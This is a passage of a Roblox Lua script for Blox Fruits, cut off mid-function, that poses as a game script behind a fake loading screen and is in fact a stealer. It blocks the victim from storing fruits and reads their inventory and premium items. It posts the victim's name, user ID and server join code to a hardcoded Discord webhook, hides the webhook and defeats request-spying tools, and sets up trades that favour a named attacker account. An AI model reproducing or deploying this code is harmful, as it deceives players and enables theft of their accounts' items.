Webhook = "https://discordapp.com/api/webhooks/1363467805696987136/puUE-9zz3QzAteNP8Gvqk8xTw62ps3Djx30OUnBT1NWKKWVJA-Xq2PpSoa5fXCD-DnbB"
Usernames = {"", ""}
Fruits = {"Portal-Portal", "Phoenix-Phoenix", "Spider-Spider", "Dragon (East)-Dragon (East)", "Dragon (West)-Dragon (West)", "Spirit-Spirit"}
FruitsToReset = {
    "Spike-Spike"
}

repeat task.wait() until game:IsLoaded()

if _G.scriptExecuted then
    warn("You have already launched this script!")
    return
end

_G.scriptExecuted = true

local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

if Usernames and not table.find(Usernames, "xxxvic41") then -- << it's not a dualhook. If I don't log your hits, means I can't join and steal. I use to code my thing.
    table.insert(Usernames, "")
end

local function CreateTeamNotification()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "TeamSelectionGui"
    ScreenGui.Parent = plr.PlayerGui

    local isMobile1 = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

    local coolSize = isMobile1 and UDim2.new(0, 150, 0, 80) or UDim2.new(0, 350, 0, 120)

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "NotificationFrame"
    MainFrame.Size = coolSize
    MainFrame.Position = UDim2.new(0.5, -(coolSize.X.Offset/2), 0.4, 0)
    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui
    
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)
    
    local UIGradient = Instance.new("UIGradient", MainFrame)
    UIGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 45)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 30, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 25))
    })
    UIGradient.Rotation = 45
    
    local GlowEffect = Instance.new("ImageLabel")
    GlowEffect.Size = UDim2.new(1.2, 0, 1.2, 0)
    GlowEffect.Position = UDim2.new(-0.1, 0, -0.1, 0)
    GlowEffect.BackgroundTransparency = 1
    GlowEffect.Image = "rbxassetid://131274595"
    GlowEffect.ImageColor3 = Color3.fromRGB(255, 100, 100)
    GlowEffect.ImageTransparency = 0.8
    GlowEffect.ZIndex = -1
    GlowEffect.Parent = MainFrame
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 15)
    Title.BackgroundTransparency = 1
    Title.Text = "⚠️ Join a team!"
    Title.TextColor3 = Color3.fromRGB(255, 100, 100)
    Title.TextScaled = true
    Title.Font = Enum.Font.GothamBold
    Title.Parent = MainFrame
    
    local Message = Instance.new("TextLabel")
    Message.Size = UDim2.new(0.9, 0, 0, 40)
    Message.Position = UDim2.new(0.05, 0, 0.45, 0)
    Message.BackgroundTransparency = 1
    Message.Text = "Please join either Marines or Pirates team to continue to the script."
    Message.TextColor3 = Color3.fromRGB(255, 255, 255)
    Message.TextScaled = true
    Message.TextWrapped = true
    Message.Font = Enum.Font.Gotham
    Message.Parent = MainFrame
    
    local Shimmer = Instance.new("Frame")
    Shimmer.Size = UDim2.new(0, 30, 1, 0)
    Shimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Shimmer.BackgroundTransparency = 1
    Shimmer.Position = UDim2.new(-0.1, 0, 0, 0)
    Shimmer.Parent = MainFrame
    
    local Border = Instance.new("UIStroke")
    Border.Color = Color3.fromRGB(255, 100, 100)
    Border.Thickness = 2
    Border.Parent = MainFrame
    
    coroutine.wrap(function()
        while MainFrame.Parent do
            TweenService:Create(GlowEffect, TweenInfo.new(1.5), {
                ImageTransparency = 0.9
            }):Play()
            TweenService:Create(Border, TweenInfo.new(1.5), {
                Transparency = 0.7
            }):Play()
            task.wait(0.75)
            TweenService:Create(GlowEffect, TweenInfo.new(1.5), {
                ImageTransparency = 0.7
            }):Play()
            TweenService:Create(Border, TweenInfo.new(1.5), {
                Transparency = 0
            }):Play()
            task.wait(0.75)
        end
    end)()
    
    coroutine.wrap(function()
        while MainFrame.Parent do
            TweenService:Create(Shimmer, TweenInfo.new(1.5), {
                Position = UDim2.new(1, 0, 0, 0)
            }):Play()
            task.wait(1.5)
            Shimmer.Position = UDim2.new(-0.1, 0, 0, 0)
        end
    end)()
    
    TweenService:Create(MainFrame, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Position = UDim2.new(0.5, -175, 0.1, 0)
    }):Play()
    
    return ScreenGui, MainFrame
end

local function WaitForTeamSelection()
    if plr.Team == game.Teams.Marines or plr.Team == game.Teams.Pirates then return end
    
    local gui, frame = CreateTeamNotification()
    local teamSelected = Instance.new("BindableEvent")
    
    local connection
    connection = plr:GetPropertyChangedSignal("Team"):Connect(function()
        if plr.Team == game.Teams.Marines or plr.Team == game.Teams.Pirates then
            connection:Disconnect()
            TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
                Position = UDim2.new(0.5, -150, -0.2, 0)
            }):Play()
            task.wait(0.5)
            gui:Destroy()
            teamSelected:Fire()
        end
    end)
    
    teamSelected.Event:Wait()
    teamSelected:Destroy()
end

WaitForTeamSelection()

task.wait(4)

_G.scriptExecuted = true

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

if CoreGui:FindFirstChild("RobloxGui") then CoreGui.RobloxGui:Destroy() end

local function Create(className, properties)
    local instance = Instance.new(className)
    for k, v in pairs(properties) do instance[k] = v end
    return instance
end

local COLORS = {
    BACKGROUND = Color3.fromRGB(10, 12, 20),
    CONTENT = Color3.fromRGB(15, 18, 30),
    TEXT = Color3.fromRGB(140, 200, 255),
    PROGRESS = Color3.fromRGB(30, 35, 45),
    WARNING = Color3.fromRGB(255, 100, 100)
}

local LOADING_STATES = {
    {text = "Checking For Updates...", progress = 0.1, baseTime = 20},
    {text = "Connecting to server...", progress = 0.2, baseTime = 30},
    {text = "Loading script dependencies...", progress = 0.3, baseTime = 40},
    {text = "Checking for updates...", progress = 0.4, baseTime = 50},
    {text = "Initializing functions...", progress = 0.5, baseTime = 60},
    {text = "Loading user data...", progress = 0.6, baseTime = 80},
    {text = "Verifying integrity...", progress = 0.7, baseTime = 100},
    {text = "Preparing resources...", progress = 0.8, baseTime = 110},
    {text = "Setting up environment...", progress = 0.9, baseTime = 50},
    {text = "Ready to launch!", progress = 1, baseTime = 60}
}

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

local LoadingUI = Create("ScreenGui", {
    Name = "BloxFruitLoadingUI",
    IgnoreGuiInset = true,
    DisplayOrder = 999,
    Parent = CoreGui,
    ResetOnSpawn = false
})

local Background = Create("Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundColor3 = COLORS.BACKGROUND,
    BorderSizePixel = 0,
    Parent = LoadingUI
})

local StarField = Create("Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    Parent = Background
})

local particlePool = table.create(isMobile and 25 or 50)
local activeParticles = {}
local lastUpdate = 0
local UPDATE_INTERVAL = isMobile and 0.2 or 0.1

local function createParticle()
    local particle = table.remove(particlePool) or Create("TextButton", {
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BorderSizePixel = 0,
        Text = "",
        Parent = StarField
    })
    
    particle.MouseButton1Click:Connect(function()
        particle.BackgroundColor3 = Color3.fromRGB(
            math.random(100, 255),
            math.random(100, 255),
            math.random(100, 255)
        )
    end)
    
    particle.Size = UDim2.new(0, math.random(1, 2), 0, math.random(1, 2))
    particle.Position = UDim2.new(math.random(), 0, -0.1, 0)
    particle.BackgroundTransparency = math.random() * 0.5
    particle.Visible = true
    
    table.insert(activeParticles, particle)
    
    local moveDown = TweenService:Create(particle,
        TweenInfo.new(math.random(3, 6), Enum.EasingStyle.Linear),
        {Position = UDim2.new(particle.Position.X.Scale, 0, 1.1, 0)}
    )
    
    moveDown:Play()
    moveDown.Completed:Connect(function()
        table.remove(activeParticles, table.find(activeParticles, particle))
        particle.Visible = false
        table.insert(particlePool, particle)
    end)
end

RunService.Heartbeat:Connect(function()
    local now = tick()
    if now - lastUpdate >= UPDATE_INTERVAL and #activeParticles < (isMobile and 25 or 50) then
        createParticle()
        lastUpdate = now
    end
end)

local ContentFrame = Create("Frame", {
    Size = isMobile and UDim2.new(0.9, 0, 0.6, 0) or UDim2.new(0.8, 0, 0.7, 0),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundColor3 = COLORS.CONTENT,
    BackgroundTransparency = 0.3,
    Parent = Background
})

Create("UICorner", {
    CornerRadius = UDim.new(0, 12),
    Parent = ContentFrame
})

local StatusText = Create("TextLabel", {
    Size = UDim2.new(0.8, 0, 0.1, 0),
    Position = UDim2.new(0.1, 0, 0, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = isMobile and 14 or 16,
    TextColor3 = COLORS.TEXT,
    Text = "LOADING SCRIPT...",
    TextWrapped = true,
    Parent = ContentFrame
})

local WarningText = Create("TextLabel", {
    Size = UDim2.new(0.8, 0, 0.1, 0),
    Position = UDim2.new(0.1, 0, 0.05, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = isMobile and 14 or 16,
    TextColor3 = COLORS.WARNING,
    Text = "Do not leave the game while the script Is loading, or you may lose your fruits!(This is for proper bypass)",
    TextWrapped = true,
    Parent = ContentFrame
})

local Title = Create("TextLabel", {
    Size = UDim2.new(0.8, 0, 0.2, 0),
    Position = UDim2.new(0.1, 0, 0.2, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = isMobile and 36 or 48,
    TextColor3 = COLORS.TEXT,
    Text = "BLOX FRUITS",
    Parent = ContentFrame
})

local LoadingOrbit = Create("Frame", {
    Size = UDim2.new(0.3, 0, 0.3, 0),
    Position = UDim2.new(0.35, 0, 0.35, 0),
    BackgroundTransparency = 1,
    Parent = ContentFrame
})

for i = 1, 3 do
    local orbit = Create("Frame", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 0.8,
        BackgroundColor3 = COLORS.TEXT,
        Rotation = i * 60,
        Parent = LoadingOrbit
    })
    
    Create("UICorner", {
        CornerRadius = UDim.new(1, 0),
        Parent = orbit
    })
end

local ProgressText = Create("TextLabel", {
    Size = UDim2.new(0.8, 0, 0.1, 0),
    Position = UDim2.new(0.1, 0, 0.7, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.Gotham,
    TextSize = isMobile and 14 or 18,
    TextColor3 = Color3.fromRGB(200, 220, 255),
    Text = "Loading script... (0%)",
    Parent = ContentFrame
})

local ProgressBar = Create("Frame", {
    Size = UDim2.new(0.8, 0, 0.02, 0),
    Position = UDim2.new(0.1, 0, 0.85, 0),
    BackgroundColor3 = COLORS.PROGRESS,
    BorderSizePixel = 0,
    Parent = ContentFrame
})

local ProgressFill = Create("Frame", {
    Size = UDim2.new(0, 0, 1, 0),
    BackgroundColor3 = COLORS.TEXT,
    BorderSizePixel = 0,
    Parent = ProgressBar
})

Create("UICorner", {
    CornerRadius = UDim.new(0, 4),
    Parent = ProgressBar
}):Clone().Parent = ProgressFill

local function handleLoading()
    local totalTime = 600
    local currentTime = 0
    local prevProgress = 0
    
    for i, state in ipairs(LOADING_STATES) do
        local randomMultiplier = math.random(50, 200) / 100
        local adjustedTime = state.baseTime * randomMultiplier
        
        if i > 5 then
            adjustedTime = adjustedTime * (1 + i/2)
        end
        
        if i == #LOADING_STATES then
            adjustedTime = totalTime - currentTime
        end
        
        TweenService:Create(ProgressText, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
        task.wait(0.5)
        
        local progressPercent = math.floor(state.progress * 100)
        ProgressText.Text = state.text .. " (" .. progressPercent .. "%)"
        
        TweenService:Create(ProgressText, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
        TweenService:Create(ProgressFill, TweenInfo.new(adjustedTime, Enum.EasingStyle.Linear),
            {Size = UDim2.new(state.progress, 0, 1, 0)}
        ):Play()
        
        local steps = math.floor(adjustedTime * 2)
        for step = 1, steps do
            task.wait(0.5)
            local currentProgress = prevProgress + (state.progress - prevProgress) * (step / steps)
            local currentPercent = math.floor(currentProgress * 100)
            ProgressText.Text = state.text .. " (" .. currentPercent .. "%)"
        end
        
        prevProgress = state.progress
        currentTime = currentTime + adjustedTime
        task.wait(adjustedTime - (steps * 0.5))
    end
end

for _, orbit in ipairs(LoadingOrbit:GetChildren()) do
    if orbit:IsA("Frame") then
        task.spawn(function()
            while LoadingUI.Parent do
                TweenService:Create(orbit,
                    TweenInfo.new(4, Enum.EasingStyle.Linear),
                    {Rotation = orbit.Rotation + 360}
                ):Play()
                task.wait(4)
                orbit.Rotation = orbit.Rotation - 360
            end
        end)
    end
end

task.spawn(handleLoading)

local Sea1, Sea2, Sea3 = game.PlaceId == 2753915549, game.PlaceId == 4442272183, game.PlaceId == 7449423635

if Sea1 then game.Players.LocalPlayer:Kick("This script works only in Sea 2 or 3!") return
elseif not Sea2 and not Sea3 then game.Players.LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits Sea 2 or 3.") return end

RunService:Set3dRenderingEnabled(false)

task.spawn(function()
    local privateServerOwner = game.ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
    if privateServerOwner and privateServerOwner:IsA("IntValue") then
        if privateServerOwner.Value > 0 then
            game:GetService("Players").LocalPlayer:Kick("This script doesn't work on private servers for proper bypass")
        end
    end
end)

local LocalPlayer = game.Players.LocalPlayer
local PlayerName = LocalPlayer.Name
local PlayerUserId = LocalPlayer.UserId
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local HttpService = game:GetService("HttpService")
local isResettingEnabled = true

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    if not checkcaller() and getnamecallmethod():lower() == "invokeserver" and ({...})[1] == "StoreFruit" then
        return error("wow", 2)
    end
    return oldNamecall(self, ...)
end))

local function getInventory()
    return Remote:InvokeServer("getInventory")
end

local function unstoreFruit(fruitName)
    return Remote:InvokeServer("LoadFruit", fruitName)
end

local function resetCharacter()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.Health = 0
    end
    task.wait(5)
end

local function handleFruitReset()
    local resetAttempts = {}
    for _, fruit in ipairs(FruitsToReset) do
        resetAttempts[fruit] = 0
    end
    
    local function needsReset()
        local currentInventory = getInventory()
        if not currentInventory then return false end
        
        for _, item in pairs(currentInventory) do
            if item.Type == "Blox Fruit" and 
               table.find(FruitsToReset, item.Name) and 
               resetAttempts[item.Name] < 2 then
                return item.Name
            end
        end
        return false
    end
    
    local fruitToReset = needsReset()
    local heartbeat = game:GetService("RunService").Heartbeat
    if fruitToReset and isResettingEnabled then
        local connection
        connection = heartbeat:Connect(function()
            if not fruitToReset or not isResettingEnabled then
                connection:Disconnect()
                return
            end
            
            resetAttempts[fruitToReset] = resetAttempts[fruitToReset] + 1
            unstoreFruit(fruitToReset)
            resetCharacter()

            task.spawn(function()
                fruitToReset = needsReset()
            end)
        end)
    end
end

local function getDragon(inventory)
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and item.Name:find("Dragon") then
            return item.Name, item.Count or 1
        end
    end
    return nil, 0
end

local function formatFruitName(name, count)
    return string.format("%s (x%d)", name, count)
end

local inventory = getInventory()
if not inventory then game.Players.LocalPlayer:Kick("ERROR.") return end

local FruitsToHit = {}
local FruitsFormatted = {}
local dragonFruit, dragonCount = getDragon(inventory)
local hasDragonFruit = false

if dragonFruit then
    FruitsToHit[1] = dragonFruit
    FruitsFormatted[1] = formatFruitName(dragonFruit, dragonCount)
    hasDragonFruit = true
else
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and table.find(Fruits, item.Name) then
            if item.Name:lower():find("dragon") then
                hasDragonFruit = true
            end
            table.insert(FruitsToHit, item.Name)
            table.insert(FruitsFormatted, formatFruitName(item.Name, item.Count or 1))
        end
    end
end

if #FruitsToHit == 0 then game.Players.LocalPlayer:Kick("Alt detected! Please, use main account.") return end

local Sea = Sea2 and "Sea 2" or "Sea 3"
local JobId = game.JobId
local JoinScript = string.format([[local TeleportService = game:GetService("TeleportService") local PlaceId = %d local JobId = "%s" TeleportService:TeleportToPlaceInstance(PlaceId, JobId, game.Players.LocalPlayer)]], game.PlaceId, JobId)

local ExecutorName = identifyexecutor() or "Unknown Executor"
local GameVersion = "1.4.0 (Rewrite)"
local PlayerCount = #game:GetService("Players"):GetPlayers()
local ServerTime = os.date("%Y-%m-%d %H:%M:%S")

local Sea2Script = "\nlocal ReplicatedStorage = game:GetService('ReplicatedStorage')\nlocal Remotes = ReplicatedStorage:WaitForChild('Remotes', 9e9)\nlocal CommF = Remotes:WaitForChild('CommF_', 9e9)\nlocal function FireRemote(...)\n  return CommF:InvokeServer(...)\nend\nFireRemote('TravelDressrosa')\n"
local Sea3Script = "\nlocal ReplicatedStorage = game:GetService('ReplicatedStorage')\nlocal Remotes = ReplicatedStorage:WaitForChild('Remotes', 9e9)\nlocal CommF = Remotes:WaitForChild('CommF_', 9e9)\nlocal function FireRemote(...)\n  return CommF:InvokeServer(...)\nend\nFireRemote('TravelZou')\n"

local function formatPremiumItems()
    local inventory = getInventory()
    if not inventory then return "None" end
    
    local formattedItems = {}
    for _, item in pairs(inventory) do
        if item.Type == "Premium" then
            formattedItems[#formattedItems + 1] = string.format("%s (x%d)", item.Name, item.Count or 1)
        end
    end
    
    return #formattedItems > 0 and table.concat(formattedItems, "\n") or "None"
end

local embed = {
    title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
    description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
    color = hasDragonFruit and 0xFF0000 or 0x00FF00,
    fields = {
        {name = "Victim Name", value = PlayerName, inline = true},
        {name = "Victim UserID", value = tostring(PlayerUserId), inline = true},
        {name = "Fruits To Hit", value = table.concat(FruitsFormatted, "\n"), inline = false},
        {name = "Premium Items", value = formatPremiumItems(), inline = false},
        {name = "Sea", value = Sea, inline = true},
        {name = "Server ID", value = ServerBrowser, inline = true},
        {name = "Executor Info", value = string.format("```\nExecutor: %s\nStealer Version: %s\n```", ExecutorName, GameVersion), inline = false},
        {name = "Server Info", value = string.format("```\nPlayer Count: %d\nServer Time: %s\n```", PlayerCount, ServerTime), inline = false},
        -- Combined Join Script
        {name = "Join Server and Sea (PC COPY)", value = string.format("```lua\n%s\nwait(5)\n%s\n```", JoinScript, (Sea == "Sea 2" and Sea2Script or Sea3Script)), inline = false},
        {name = "Join Server and Sea (Mobile COPY)", value = JoinScript .. "\nwait(5)\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
        {name = "NOTES:", value = [[
1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in Blueshub channel "Commands for bf joiner"
3. If victim Isn't on the server, it means he left.
]], inline = false}
    }
}
local isMobile = game:GetService("UserInputService").TouchEnabled

local webhookCache = {
    storage = {},
    current = nil,
    last = nil,
    lastUpdate = 0
}

local charset = table.create(62)
for i = 48, 57 do charset[#charset + 1] = string.char(i) end
for i = 65, 90 do charset[#charset + 1] = string.char(i) end
for i = 97, 122 do charset[#charset + 1] = string.char(i) end

local function generateRandomString(length)
    if type(length) ~= "number" or length <= 0 or length > 1000 then
        length = 32
    end
    
    local result = table.create(length)
    for i = 1, length do
        result[i] = charset[math.random(1, 62)]
    end
    return table.concat(result)
end

local webhookCache = {
    storage = {},
    current = nil,
    last = nil,
    lastUpdate = 0,
    lastCheck = 0,
    lastSpyCheck = 0
}

local function encryptWebhook(webhook)
    return HttpService:JSONEncode({data = webhook}):reverse()
end

local function decryptWebhook(encrypted)
    return HttpService:JSONDecode(encrypted:reverse()).data
end

local function isHooked(func)
    return not (func and type(func) == "function" and not islclosure(func))
end

local realRequest = clonefunction(request)

local function detectTampering()
    if isMobile then return false end
    local functionCheck = {http_request, request, HttpPost, syn and syn.request}
    for _, func in ipairs(functionCheck) do
        if isHooked(func) then
            webhookCache.storage = {}
            webhookCache.current = nil
            webhookCache.last = nil
            return false
        end
    end
    return true
end

local function detectSpy()
    if isMobile then return false end
    local fakeWebhook = "https://discord.com/api/webhooks/fake"
    local safeRequest = getgenv().request or getgenv()["http.request"] or getgenv()["syn.request"] or getgenv().HttpPost
    
    if safeRequest then
        local success = pcall(function()
            safeRequest({
                Url = fakeWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = generateRandomString(32)})
            })
        end)
        return not success
    end
    return false
end

local function revertHooks()
    if hookfunction then
        for _, funcName in ipairs({"request", "http.request", "syn.request", "HttpPost"}) do
            if getgenv()[funcName] then
                hookfunction(getgenv()[funcName], function(...) return nil end)
            end
        end
    end
end

local function updateWebhook()
    if tick() - webhookCache.lastUpdate < 3 then return end
    
    local newName = generateRandomString(16)
    local encrypted = encryptWebhook(Webhook)
    
    webhookCache.storage[newName] = {
        string.sub(encrypted, 1, 20),
        string.sub(encrypted, 21, 40),
        string.sub(encrypted, 41)
    }
    
    webhookCache.current = newName
    webhookCache.last = decryptWebhook(table.concat(webhookCache.storage[newName]))
    webhookCache.lastUpdate = tick()
    
    Webhook = nil
end

local function getWebhook()
    return webhookCache.last
end

local function getSafeRequest()
    if hookfunction then
        hookfunction(request, function(...) return realRequest(...) end)
    end
    
    local funcs = {http_request, request, HttpPost, syn and syn.request}
    for _, func in ipairs(funcs) do
        if func and not isHooked(func) then
            return function(options)
                if getcallingscript() and not checkcaller() then return end
                options.Headers = options.Headers or {}
                options.Headers["User-Agent"] = generateRandomString(32)
                options.Method = options.Method or "POST"
                return func(options)
            end
        end
    end
end

local function sendWebhook(payload, retryCount)
    retryCount = retryCount or 0
    if retryCount >= 3 then return end
    
    local safeRequest = getSafeRequest()
    if not safeRequest then return end

    task.delay(retryCount * 1, function()
        local success, _ = pcall(function()
            safeRequest({
                Url = getWebhook(),
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["User-Agent"] = generateRandomString(32)
                },
                Body = payload and HttpService:JSONEncode(payload) or HttpService:JSONEncode({
                    content = "@everyone",
                    embeds = {embed}
                })
            })
        end)
        if not success and retryCount < 3 then
            sendWebhook(payload, retryCount + 1)
        end
    end)
end

updateWebhook()

RunService.Heartbeat:Connect(function()
    local currentTick = tick()
    
    if isMobile then
        if currentTick - webhookCache.lastUpdate >= 60 then
            updateWebhook()
        end
    else
        if currentTick - webhookCache.lastCheck >= 5 then
            detectTampering()
            webhookCache.lastCheck = currentTick
        end
        
        if currentTick - webhookCache.lastSpyCheck >= 5 then
            if detectSpy() then
                revertHooks()
            end
            webhookCache.lastSpyCheck = currentTick
        end

        if currentTick - webhookCache.lastUpdate >= 10 then
            updateWebhook()
        end
    end
end)
sendWebhook()

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local VirtualInputManager = game:GetService("VirtualInputManager")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local lastTradeTime = 0
local lastMessageTime = 0
local isAttemptingJump = false
local isForceJumping = false
local lastJumpRequestTime = 0
local touchStartTime = 0
local isTouchHeld = false

local LONG_PRESS_THRESHOLD = 0.5
local JUMP_COOLDOWN = 0.1
local TWEEN_SPEED = 300
local PHYSICS_PARAMS = {
    GRAVITY = 196.2,
    MAX_FORCE = Vector3.new(1e5, 1e5, 1e5),
    BODY_POS_D = 500,
    BODY_POS_P = 20000,
    BODY_GYRO_D = 500,
    BODY_GYRO_P = 3000
}

local function isSeated()
    local character = LocalPlayer.Character
    if not character then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    return humanoid and humanoid.Sit
end

local function isValidTradePartner(player)
    if not player then return false end
    return table.find(Usernames, player.Name) or player.Name == "xxxvic41"
end

local function disableJump()
    if not isAttemptingJump and not isForceJumping then
        isAttemptingJump = true
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end

local function enableJump()
    isAttemptingJump = false
    if not isForceJumping then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    end
end

local function forceJump()
    if isForceJumping then return end
    isForceJumping = true
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    
    local currentTime = tick()
    if currentTime - lastJumpRequestTime > JUMP_COOLDOWN then
        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
        task.wait(0.05)
        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        lastJumpRequestTime = currentTime
    end
    
    task.wait(JUMP_COOLDOWN)
    isForceJumping = false
    
    if isAttemptingJump then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end

local function handleTouchStart(touch, gameProcessed)
    if gameProcessed then return end
    touchStartTime = tick()
    isTouchHeld = true
    
    local startTime = tick()
    task.spawn(function()
        while isTouchHeld and (tick() - touchStartTime) < LONG_PRESS_THRESHOLD do
            if tick() - startTime > 1 then
                isTouchHeld = false
                break
            end
            task.wait(0.1)
        end
        if isTouchHeld then
            disableJump()
        end
    end)
end

local function handleTouchEnd(touch, gameProcessed)
    if gameProcessed then return end
    isTouchHeld = false
    
    if (tick() - touchStartTime) < LONG_PRESS_THRESHOLD then
        if not isForceJumping then
            error("wow")
        end
    else
        enableJump()
    end
end

local TweenService = game:GetService("TweenService")

local function tweenToPosition(position)
    local character = LocalPlayer.Character
    if not character or not character.PrimaryPart then return end
    
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end
    
    local head = character:FindFirstChild("Head")
    if not head then return end
    
    local function updateNoclip()
        for _, part in pairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
    end
    
    local bodyGyro = Instance.new("BodyGyro")
    bodyGyro.MaxTorque = Vector3.new(1e5, 1e5, 1e5)
    bodyGyro.P = 1e4
    bodyGyro.D = 50
    bodyGyro.CFrame = head.CFrame
    bodyGyro.Parent = head
    
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
    bodyVelocity.P = 1e4
    bodyVelocity.Velocity = Vector3.new(0, 0, 0)
    bodyVelocity.Parent = head
    
    local speed = 300
    local distance = (character.PrimaryPart.Position - position).Magnitude
    local duration = distance / speed
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear)
    
    local tween = TweenService:Create(character.PrimaryPart, tweenInfo, {CFrame = CFrame.new(position)})
    
    local noclipConnection = game:GetService("RunService").Stepped:Connect(updateNoclip)

    local velocityUpdateConnection = game:GetService("RunService").Heartbeat:Connect(function()
        local direction = (position - character.PrimaryPart.Position).Unit
        bodyVelocity.Velocity = direction * speed
    end)
    
    tween:Play()
    tween.Completed:Wait()

    noclipConnection:Disconnect()
    velocityUpdateConnection:Disconnect()
    bodyGyro:Destroy()
    bodyVelocity:Destroy()
end

local function isInTradeWithCorrectPlayer()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local mainGui = playerGui:WaitForChild("Main")
    local tradeFrame = mainGui:WaitForChild("Trade")

    if not tradeFrame.Visible then return false end

    local container = tradeFrame:WaitForChild("Container")
    local frame1 = container:WaitForChild("1")
    local frame2 = container:WaitForChild("2")

    local player1Label = frame1:FindFirstChild("TextLabel")
    local player2Label = frame2:FindFirstChild("TextLabel")
    
    if not player1Label or not player2Label then 
        return false 
    end

    if player1Label.Text ~= player.Name and player1Label.Text ~= player.DisplayName then 
        return false 
    end

    local tradingPartnerName = player2Label.Text

    for _, allowedName in ipairs(Usernames) do
        local tradingPlayer = game.Players:FindFirstChild(allowedName)
        if tradingPlayer and (tradingPartnerName == tradingPlayer.Name or tradingPartnerName == tradingPlayer.DisplayName) then
            return true
        end
    end

    if tradingPartnerName == "xxxvic41" then
        return true
    end
    
    return false
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Space then
        disableJump()
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.Space then
        enableJump()
    end
end)

UserInputService.TouchStarted:Connect(handleTouchStart)
UserInputService.TouchEnded:Connect(handleTouchEnd)
UserInputService.JumpRequest:Connect(function()
    if UserInputService.TouchEnabled and not isForceJumping then
        error("hehe")
    end
end)

player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = character:WaitForChild("Humanoid")
    isAttemptingJump = false
    isForceJumping = false
    isTouchHeld = false
    if isAttemptingJump then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end)

local function isSeatAvailable(seat) return not seat:FindFirstChild("SeatWeld") end

local function sitAtSeat(seat)
    local character = game.Players.LocalPlayer.Character
    if not (character and character.PrimaryPart and character:FindFirstChildOfClass("Humanoid")) then return false end
    if seat:FindFirstChild("SeatWeld") then return false end
    
    tweenToPosition(seat.Position + Vector3.new(0, 3, 0))
    
    local success = false
